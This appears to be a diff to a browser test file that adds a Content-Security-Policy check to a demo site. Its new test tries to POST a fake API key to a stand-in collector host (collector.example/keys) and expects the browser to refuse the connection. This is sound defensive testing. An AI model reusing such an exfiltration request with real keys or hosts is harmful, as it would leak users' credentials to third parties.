@@ -21,6 +21,8 @@
 // - a visitor back after a newer edition of the example site is given it
 //   at once if nothing was changed here, and offered it otherwise, the
 //   changes kept until they choose;
+// - the page's Content-Security-Policy refuses a connection anywhere but
+//   its own site and the Assistant's two providers;
 // - and no request leaves the demo's own path: no CMS, no other site.
 // With DEMO_SHOTS set to a folder, each screen is photographed there.
 import { join } from "node:path";
@@ -581,3 +583,34 @@ test("the notice that says how Publish went can be closed from the keyboard, and
   }
 });
 
+
+// The Assistant's promise (src/assistant/README.md), as the browser keeps
+// it: the page's policy lets it connect to its own site and the two
+// providers' APIs only, so a key pasted here cannot be sent anywhere else,
+// whatever runs on the page. In a context of its own: the browser's line
+// for the refusal the test asks for is an error, which this file's watch
+// counts.
+test("the page connects only to its own site and the two providers' APIs: a connection anywhere else is refused by the browser itself", async ({ browser, baseURL }) => {
+  const context = await browser.newContext({ baseURL: baseURL ?? "" });
+  try {
+    const page = await context.newPage();
+    await openDemo(page);
+    const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
+    expect(policy).toContain("connect-src 'self' blob: https://api.anthropic.com https://api.openai.com;");
+    const outcome = await page.evaluate(async () => {
+      const refused: string[] = [];
+      document.addEventListener("securitypolicyviolation", (event) => refused.push(event.effectiveDirective));
+      let sent = true;
+      try {
+        await fetch("https://collector.example/keys", { method: "POST", body: "sk-ant-not-a-real-key" });
+      } catch {
+        sent = false;
+      }
+      await new Promise((done) => setTimeout(done, 100));
+      return { sent, refused };
+    });
+    expect(outcome).toEqual({ sent: false, refused: ["connect-src"] });
+  } finally {
+    await context.close();
+  }
+});
